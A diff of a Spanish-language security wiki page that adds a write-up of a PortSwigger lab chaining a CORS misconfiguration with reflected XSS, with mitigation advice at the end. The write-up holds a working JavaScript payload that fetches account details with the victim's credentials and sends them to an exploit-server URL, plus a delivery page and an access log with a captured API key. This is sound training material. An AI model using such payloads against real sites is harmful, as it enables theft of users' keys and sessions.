@@ -10,13 +10,9 @@
       
       
       
-        <link rel="canonical" href="https://igruntplay.github.io/BSCP/practicioner-labs-notes/">
+        <link rel="canonical" href="https://igruntplay.github.io/BSCP/cors-practicioner-lab-notes/">
       
       
-        <link rel="prev" href="../BSCP/">
-      
-      
-        <link rel="next" href="../OAuth-account-hijacking-via-redirect_uri/">
       
       
         
@@ -27,7 +23,7 @@
     
     
       
-        <title>BSCP Practitioner Labs - Grunt's Personal Wiki</title>
+        <title>Write-up: CORS con XSS encadenado - PortSwigger Lab - Grunt's Personal Wiki</title>
       
     
     
@@ -78,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#practicioner-labs-notes-index" class="md-skip">
+        <a href="#write-up-cors-con-xss-encadenado-portswigger-lab" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -114,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              BSCP Practitioner Labs
+              Write-up: CORS con XSS encadenado - PortSwigger Lab
             
           </span>
         </div>
@@ -828,10 +824,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -852,11 +846,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
@@ -877,7 +871,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -920,37 +914,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    BSCP Practitioner Labs
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../practicioner-labs-notes/" class="md-nav__link">
         
   
   
@@ -966,37 +933,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Tabla de contenidos
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#labs" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Labs
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1594,7 +1530,7 @@
 
 
   
-    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/BSCP/practicioner-labs-notes.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
+    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/BSCP/cors-practicioner-lab-notes.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
     </a>
@@ -1602,19 +1538,157 @@
   
 
 
-<h1 id="practicioner-labs-notes-index">Practicioner labs notes index<a class="headerlink" href="#practicioner-labs-notes-index" title="Permanent link">&para;</a></h1>
-<p>Step 1: Complete all the listed practitioner-level labs
-Work through all of the labs in the list below, completing each lab in turn. There is no set time frame for completing the labs, but you must be able to do so without requiring access to the solutions provided.</p>
-<p>If you're unable to complete the lab you selected, go back to the learning materials and read through the content carefully, working through all the labs in that topic to make sure you're comfortable with the vulnerability class and exploit techniques it covers.</p>
-<hr />
+<h1 id="write-up-cors-con-xss-encadenado-portswigger-lab">Write-up: CORS con XSS encadenado - PortSwigger Lab<a class="headerlink" href="#write-up-cors-con-xss-encadenado-portswigger-lab" title="Permanent link">&para;</a></h1>
+<h2 id="descripcion-del-lab">Descripción del Lab<a class="headerlink" href="#descripcion-del-lab" title="Permanent link">&para;</a></h2>
+<p>Este laboratorio demuestra una vulnerabilidad de configuración CORS (Cross-Origin Resource Sharing) combinada con un XSS (Cross-Site Scripting) reflejado, que permite robar información sensible de usuarios autenticados.</p>
+<p><strong>Objetivo:</strong> Obtener el API key del usuario <code>administrator</code> mediante la explotación de CORS y XSS.</p>
+<h2 id="vulnerabilidades-identificadas">Vulnerabilidades Identificadas<a class="headerlink" href="#vulnerabilidades-identificadas" title="Permanent link">&para;</a></h2>
+<h3 id="1-cors-mal-configurado">1. CORS mal configurado<a class="headerlink" href="#1-cors-mal-configurado" title="Permanent link">&para;</a></h3>
+<p>El endpoint <code>/accountDetails</code> devuelve información sensible del usuario (incluyendo el API key) y está configurado para aceptar peticiones con credenciales desde cualquier subdominio del lab:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nf">GET</span> <span class="nn">/accountDetails</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">0ad900c9031651e180a9c14d004400f0.web-security-academy.net</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>HTTP/2 200 OK
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Access-Control-Allow-Credentials: true
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Access-Control-Allow-Origin: http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net
+</span></code></pre></div>
+<p><strong>Problema:</strong> La configuración permite subdominios tanto HTTP como HTTPS, lo cual es peligroso si algún subdominio es vulnerable.</p>
+<h3 id="2-xss-reflejado-en-el-subdominio-stock">2. XSS Reflejado en el subdominio <code>stock</code><a class="headerlink" href="#2-xss-reflejado-en-el-subdominio-stock" title="Permanent link">&para;</a></h3>
+<p>El parámetro <code>productId</code> en la funcionalidad "Check stock" es vulnerable a XSS:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=&lt;script&gt;alert(1)&lt;/script&gt;
+</span></code></pre></div>
+<h2 id="explotacion">Explotación<a class="headerlink" href="#explotacion" title="Permanent link">&para;</a></h2>
+<h3 id="paso-1-verificar-la-configuracion-cors">Paso 1: Verificar la configuración CORS<a class="headerlink" href="#paso-1-verificar-la-configuracion-cors" title="Permanent link">&para;</a></h3>
+<p>Usando Burp Repeater, enviamos una petición a <code>/accountDetails</code> con un header <code>Origin</code> apuntando a un subdominio:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nf">GET</span> <span class="nn">/accountDetails</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">0ad900c9031651e180a9c14d004400f0.web-security-academy.net</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">session=...</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="err">&lt;REDACTED&gt;</span>
+</span></code></pre></div>
+<p><strong>Respuesta:</strong>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span> <span class="m">200</span> <span class="ne">OK</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="na">Access-Control-Allow-Credentials</span><span class="o">:</span> <span class="l">true</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="na">Access-Control-Allow-Origin</span><span class="o">:</span> <span class="l">http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>{
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>  &quot;username&quot;: &quot;wiener&quot;,
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>  &quot;email&quot;: &quot;...&quot;,
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>  &quot;apikey&quot;: &quot;...&quot;,
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>  &quot;sessions&quot;: [...]
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>}
+</span></code></pre></div></p>
+<p>Confirmado: el servidor refleja el <code>Origin</code> y permite credenciales desde subdominios.</p>
+<h3 id="paso-2-identificar-el-xss">Paso 2: Identificar el XSS<a class="headerlink" href="#paso-2-identificar-el-xss" title="Permanent link">&para;</a></h3>
+<p>Visitamos la funcionalidad "Check stock" en cualquier producto y observamos que hace una petición a:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=1&amp;storeId=1
+</span></code></pre></div>
+<p>Probamos inyectar código JavaScript en <code>productId</code>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=&lt;script&gt;alert(1)&lt;/script&gt;
+</span></code></pre></div>
+<p>El código se ejecuta, confirmando la vulnerabilidad XSS.</p>
+<h3 id="paso-3-crear-el-exploit-encadenado">Paso 3: Crear el exploit encadenado<a class="headerlink" href="#paso-3-crear-el-exploit-encadenado" title="Permanent link">&para;</a></h3>
+<p>El ataque funciona en dos partes:</p>
+<h4 id="a-payload-xss-se-ejecuta-en-el-subdominio-stock">A) Payload XSS (se ejecuta en el subdominio <code>stock</code>)<a class="headerlink" href="#a-payload-xss-se-ejecuta-en-el-subdominio-stock" title="Permanent link">&para;</a></h4>
+<p>Este código JavaScript roba el API key haciendo una petición con credenciales desde un origen permitido por CORS:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">xhr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://exploit-SERVER_ID.exploit-server.net/log?data=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="p">};</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails&#39;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></code></pre></div>
+<h4 id="b-pagina-en-el-exploit-server">B) Página en el Exploit Server<a class="headerlink" href="#b-pagina-en-el-exploit-server" title="Permanent link">&para;</a></h4>
+<p>Esta página redirige a la víctima al subdominio vulnerable con el payload XSS inyectado:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=&lt;script&gt;var xhr=new XMLHttpRequest();xhr.onload=function(){location=&quot;https://exploit-SERVER_ID.exploit-server.net/log?data=&quot;%2BencodeURIComponent(this.responseText);};xhr.open(&quot;GET&quot;,&quot;https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails&quot;,true);xhr.withCredentials=true;xhr.send();&lt;\/script&gt;&amp;storeId=1&#39;</span><span class="p">;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p><strong>Nota importante:</strong> El <code>&lt;\/script&gt;</code> está escapado para evitar que cierre prematuramente el script contenedor.</p>
+<h3 id="paso-4-desplegar-el-exploit">Paso 4: Desplegar el exploit<a class="headerlink" href="#paso-4-desplegar-el-exploit" title="Permanent link">&para;</a></h3>
 <ol>
-<li><a href="../lab-file-upload-web-shell-upload-via-extension-blacklist-bypass/">WebShell via extension blacklist bypass</a></li>
-<li><a href="../OAuth-account-hijacking-via-redirect_uri/">OAuth account hijacking via redirect_uri</a></li>
+<li><strong>Copiar el código HTML</strong> al cuerpo del exploit server</li>
+<li><strong>Click en "Store"</strong> para guardar el exploit</li>
+<li><strong>Click en "View exploit"</strong> para probarlo con tu propia sesión (deberías ver tu API key en la URL)</li>
+<li><strong>Click en "Deliver exploit to victim"</strong> para enviarlo al administrador</li>
 </ol>
-<hr />
-<h2 id="labs">Labs<a class="headerlink" href="#labs" title="Permanent link">&para;</a></h2>
+<h3 id="paso-5-recuperar-el-api-key">Paso 5: Recuperar el API key<a class="headerlink" href="#paso-5-recuperar-el-api-key" title="Permanent link">&para;</a></h3>
+<p>Ir a <strong>"Access log"</strong> en el exploit server y buscar la entrada que contenga <code>/log?data=</code>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>10.0.3.81 2026-02-12 21:19:25 +0000 
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&quot;GET /log?data=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%2245SgnHiFRDyJAHh7at2dHYkWmzkkzKut%22%0A%20%20%5D%0A%7D HTTP/1.1&quot; 200
+</span></code></pre></div>
+<p>Decodificando el parámetro <code>data</code>:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">{</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;administrator&quot;</span><span class="p">,</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="nt">&quot;apikey&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC&quot;</span><span class="p">,</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">  </span><span class="nt">&quot;sessions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">    </span><span class="s2">&quot;45SgnHiFRDyJAHh7at2dHYkWmzkkzKut&quot;</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">  </span><span class="p">]</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>API Key robado:</strong> <code>h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC</code></p>
+<h3 id="paso-6-completar-el-lab">Paso 6: Completar el lab<a class="headerlink" href="#paso-6-completar-el-lab" title="Permanent link">&para;</a></h3>
+<p>Enviar el API key en la solución del laboratorio.</p>
+<h2 id="flujo-del-ataque">Flujo del Ataque<a class="headerlink" href="#flujo-del-ataque" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>1. Víctima accede al exploit server
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>   ↓
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>2. JavaScript redirige a: http://stock.LAB_ID/?productId=&lt;XSS_PAYLOAD&gt;
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>   ↓
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>3. XSS se ejecuta en el contexto del subdominio stock
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>   ↓
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>4. Desde stock (origen permitido por CORS):
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>   - XMLHttpRequest a /accountDetails con withCredentials=true
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>   - Browser adjunta cookies de sesión automáticamente
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>   ↓
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>5. Servidor responde con:
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>   - Access-Control-Allow-Origin: http://stock...
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>   - Access-Control-Allow-Credentials: true
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>   - JSON con datos sensibles
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>   ↓
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>6. JavaScript lee la respuesta (CORS lo permite)
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>   ↓
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>7. Exfiltra datos al exploit server: /log?data=ENCODED_JSON
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>   ↓
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>8. Atacante lee el Access log y obtiene el API key
+</span></code></pre></div>
+<h2 id="lecciones-aprendidas">Lecciones Aprendidas<a class="headerlink" href="#lecciones-aprendidas" title="Permanent link">&para;</a></h2>
+<h3 id="errores-de-seguridad-explotados">Errores de seguridad explotados:<a class="headerlink" href="#errores-de-seguridad-explotados" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>CORS demasiado permisivo:</strong></li>
+<li>Permitir <strong>todos los subdominios</strong> es peligroso</li>
+<li>Mezclar HTTP y HTTPS en subdominios amplía la superficie de ataque</li>
+<li>
+<p><code>Access-Control-Allow-Credentials: true</code> debe usarse solo con orígenes específicos y de confianza</p>
+</li>
+<li>
+<p><strong>XSS no sanitizado:</strong></p>
+</li>
+<li>El parámetro <code>productId</code> no valida/escapa la entrada del usuario</li>
+<li>
+<p>Un solo XSS en un subdominio compromete toda la política CORS</p>
+</li>
+<li>
+<p><strong>Falta de validación del origen:</strong></p>
+</li>
+<li>El servidor refleja el <code>Origin</code> sin validación estricta</li>
+<li>Debería usar una lista blanca explícita de orígenes confiables</li>
+</ol>
+<h3 id="mitigaciones-recomendadas">Mitigaciones recomendadas:<a class="headerlink" href="#mitigaciones-recomendadas" title="Permanent link">&para;</a></h3>
 <ul>
-<li><a href="../cors-practicioner-lab-notes/">CORS</a></li>
+<li><strong>Nunca usar wildcards o regex demasiado amplios</strong> en CORS</li>
+<li><strong>Validar y escapar toda entrada del usuario</strong> para prevenir XSS</li>
+<li><strong>Usar HTTPS exclusivamente</strong> en todos los subdominios</li>
+<li><strong>Implementar CSP (Content Security Policy)</strong> para mitigar XSS</li>
+<li><strong>Auditar regularmente</strong> la configuración de CORS en endpoints sensibles</li>
+<li><strong>Considerar alternativas a CORS</strong> como tokens de API en headers custom</li>
+</ul>
+<h2 id="referencias">Referencias<a class="headerlink" href="#referencias" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/cors">PortSwigger Web Security Academy - CORS</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html">OWASP - CORS Security Cheat Sheet</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">MDN - Cross-Origin Resource Sharing (CORS)</a></li>
 </ul>
 
 
